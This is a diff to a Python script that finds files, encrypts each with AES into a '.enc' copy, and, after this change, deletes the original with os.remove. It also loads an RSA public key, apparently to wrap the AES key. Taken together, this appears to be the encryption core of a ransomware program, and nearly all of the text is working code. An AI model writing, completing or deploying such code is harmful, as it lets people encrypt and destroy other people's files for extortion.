@@ -1,7 +1,9 @@
-from Crypto.Cipher import AES
+from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Random import get_random_bytes
 from get_files import *
 import sys
+import os
+from Crypto.PublicKey import RSA
 
 def encrypt_all():
     try : 
@@ -11,17 +13,24 @@ def encrypt_all():
         key = get_random_bytes(32)
         with open('keys/aes.key','wb') as f:
             f.write(key)
-    files_clear = find_files()
+
+    with open('keys/public.pem','r') as f :
+        public = RSA.import_key(f.read())
+
+    files_clear = find_files_clear()
+
     for filename in files_clear :
         encrypt(filename,key)
-    return 'ok'
+
+    return 'done'
 
 def encrypt(filename,key):
     cipher = AES.new(key, AES.MODE_EAX)
     with open(filename,'rb') as f :
         data = f.read()
     ciphertext, tag = cipher.encrypt_and_digest(data)
-    with open(filename+'.enc',"wb") as f_out:
+    os.remove(filename)
+    with open(filename+'.enc','wb') as f_out:
         [f_out.write(x) for x in (cipher.nonce, tag, ciphertext) ]
 
 def decrypt(filename,key):
